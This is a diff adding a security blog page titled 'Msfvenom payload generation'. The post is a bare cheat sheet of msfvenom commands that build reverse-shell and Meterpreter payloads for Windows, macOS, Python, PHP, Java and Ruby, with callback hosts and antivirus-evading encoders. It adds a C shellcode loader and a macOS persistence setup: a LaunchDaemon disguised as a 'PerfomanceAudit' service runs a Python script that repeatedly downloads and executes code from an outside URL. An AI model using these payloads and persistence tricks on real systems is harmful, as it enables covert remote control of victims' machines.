@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="author" content="Alexey Pronin">
+  
+  <link rel="canonical" href="../../post/msfvenom-payload-generation/" />
+  <meta name="theme-color" content="#563d7c">
+  
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <title>Msfvenom payload generation - vuln.be</title>
+  <link href="../../css/main.css" rel="stylesheet">
+  
+  <link rel="alternate" type="application/atom+xml" href="../../atom.xml" title="vuln.be Atom Feed">
+  <link rel="alternate" type="application/rss+xml" href="../../rss.xml" title="vuln.be RSS Feed">
+</head>
+
+<body>
+  <div class="container">
+    <header class="blog-header py-3">
+      <div class="row flex-nowrap justify-content-between align-items-center">
+        <div class="col-12 text-center">
+          <a class="blog-header-logo text-dark" href="../../">VULN.BE</a>
+      </div>
+    </header>
+
+    <div class="nav-scroller py-1 mb-4 border-bottom">
+      <nav class="nav d-flex justify-content-between">
+        <a class="p-2 text-muted" href="../../">Home</a><a class="p-2 text-muted" href="../../tags/">Tags</a><a class="p-2 text-muted" href="../../archives/">Archives</a><a class="p-2 text-muted" href="../../page/contacts/">Contacts</a><a class="p-2 text-muted" href="../../page/about/">About</a>
+      </nav>
+    </div>
+    
+    <div class="blog-main px-2 my-4">
+      <div class="blog-post">
+  <div class="blog-post-meta font-weight-light">
+    <time datetime="2017-03-31" pubdate class="text-uppercase" data-updated="true">31 March 2017</time>
+    <div class="tags text-lowercase"><a href="../../tags/msfvenom/">msfvenom</a> | <a href="../../tags/metasploit/">metasploit</a> | <a href="../../tags/meterpreter/">meterpreter</a> | <a href="../../tags/payload/">payload</a> | <a href="../../tags/reverse shell/">reverse shell</a> | <a href="../../tags/shell/">shell</a></div>
+  </div>
+  <h1 class><a href="../../post/msfvenom-payload-generation/">Msfvenom payload generation</a></h1>
+  
+  <div class="mb-4 post-content">
+    <p>Some msfvenom commands</p>
+<!--more-->
+<h2 id="windows-x64-reverse-tcp-meterpreter-payload">Windows x64 reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="co"># Exe output</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">msfvenom</span> -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=cc.vuln.be LPORT=51337 SessionExpirationTimeout=0 SessionCommunicationTimeout=0 -f exe -o win64https.exe</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="co"># Generates a payload in 'C' format that is encrypted with RC4. </span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="co"># You need to build your own loader in C/C++.</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a><span class="ex">msfvenom</span> -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=cc.vuln.be LPORT=51337 SessionExpirationTimeout=0 SessionCommunicationTimeout=0 EXITFUNC=thread -f powershell -t 0 -e generic/none</span></code></pre></div>
+<h2 id="windows-x64-reverse-https-meterpreter-payload">Windows x64 reverse HTTPS Meterpreter payload</h2>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=cc.vuln.be LPORT=443 SessionExpirationTimeout=0 SessionCommunicationTimeout=0 -f exe -o win64https.exe</span></code></pre></div>
+<h2 id="windows-x32-reverse-tcp-meterpreter-payload">Windows x32 reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -a x32 --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe</span></code></pre></div>
+<h2 id="windows-x64-reverse-https-powershell-meterpteter-payload">Windows x64 reverse HTTPS powershell Meterpteter payload</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 -e cmd/powershell_base64 -f psh -o payload.ps1</span></code></pre></div>
+<h2 id="python-reverse-https-meterpreter-payload">Python reverse HTTPS Meterpreter payload</h2>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">msfvenom</span> --platform python -p python/meterpreter/reverse_https LHOST=cc.vuln.be LPORT=443 SessionExpirationTimeout=0 SessionCommunicationTimeout=0 -o pythonHttps.py</span></code></pre></div>
+<h2 id="php-reverse-tcp-meterpreter-payload">PHP reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e php/base64 -f raw -o payload.php</span></code></pre></div>
+<h2 id="osx-x64-reverse-tcp-meterpreter-payload">OSX x64 reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=51339 -f macho -o payload.bin</span></code></pre></div>
+<h2 id="java-reverse-tcp-meterpreter-payload">Java reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">msfvenom</span> --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -o payload.jar</span></code></pre></div>
+<h2 id="java-reverse-tcp-shell-jsp-payload">Java reverse TCP shell JSP payload</h2>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -o payload.jsp</span></code></pre></div>
+<h2 id="ruby-reverse-tcp-meterpreter-payload">Ruby reverse TCP Meterpreter payload</h2>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">msfvenom</span> --platform ruby -p ruby/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -o payload.rb</span></code></pre></div>
+<h2 id="custom-loader">Custom loader</h2>
+<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="er"># Loader</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="dt">char</span> code[] = <span class="st">&quot;shellcode&quot;</span>;</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv)</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a>{</span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a>  <span class="dt">int</span> (*func)();</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a>  func = (<span class="dt">int</span> (*)()) code;</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a>  (<span class="dt">int</span>)(*func)();</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a>}</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a><span class="co">// or</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true"></a><span class="dt">int</span> (*ret)() = (<span class="dt">int</span>(*)())buf; ret(); </span></code></pre></div>
+<h2 id="persistence">Persistence</h2>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="fu">cat</span> /etc/vendor/touch</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a><span class="co">#!/usr/bin/python</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="co"># ...</span></span></code></pre></div>
+<p>/Library/LaunchDaemons/com.support.PerfomanceAudit.plist:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="kw">&lt;?xml</span> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;<span class="kw">?&gt;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="dt">&lt;!DOCTYPE </span>plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;<span class="dt">&gt;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a><span class="kw">&lt;plist</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a><span class="kw">&lt;dict&gt;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a>    <span class="kw">&lt;key&gt;</span>Label<span class="kw">&lt;/key&gt;</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a>    <span class="kw">&lt;string&gt;</span>com.support.PerfomanceAudit<span class="kw">&lt;/string&gt;</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a>    <span class="kw">&lt;key&gt;</span>LaunchOnlyOnce<span class="kw">&lt;/key&gt;</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true"></a>    <span class="kw">&lt;true/&gt;</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true"></a>    <span class="kw">&lt;key&gt;</span>ProgramArguments<span class="kw">&lt;/key&gt;</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true"></a>    <span class="kw">&lt;array&gt;</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true"></a>        <span class="kw">&lt;string&gt;</span>/etc/vendor/touch<span class="kw">&lt;/string&gt;</span></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true"></a>    <span class="kw">&lt;/array&gt;</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true"></a>    <span class="kw">&lt;key&gt;</span>RunAtLoad<span class="kw">&lt;/key&gt;</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true"></a>    <span class="kw">&lt;true/&gt;</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true"></a><span class="kw">&lt;/dict&gt;</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true"></a><span class="kw">&lt;/plist&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="fu">chmod</span> +x /etc/vendor/touch</span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="im">import</span> sys</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a><span class="im">import</span> time</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a>u<span class="op">=</span><span class="bu">__import__</span>(<span class="st">'urllib'</span><span class="op">+</span>{<span class="dv">2</span>:<span class="st">''</span>,<span class="dv">3</span>:<span class="st">'.request'</span>}[sys.version_info[<span class="dv">0</span>]],fromlist<span class="op">=</span>(<span class="st">'urlopen'</span>,))</span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true"></a><span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true"></a>    <span class="cf">try</span>:</span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true"></a>        r<span class="op">=</span>u.urlopen(<span class="st">'https://meter.site/meter'</span>)</span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true"></a>        <span class="bu">exec</span>(r.read())</span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true"></a>        exit(<span class="dv">0</span>)      </span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true"></a>    <span class="cf">except</span>:</span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true"></a>        time.sleep(<span class="dv">60</span>)</span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true"></a>        <span class="cf">continue</span></span></code></pre></div>
+  </div>
+  
+</div>
+
+    </div>
+    <footer class="p-2 d-flex justify-content-between blog-footer font-weight-lighter border-top">
+      <p>Copyright © 2023 Alexey Pronin</p>
+      <p>Powered by <a href="https://jaspervdj.be/hakyll/">Hakyll</a>.</p>
+    </footer>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+</body>
+</html>
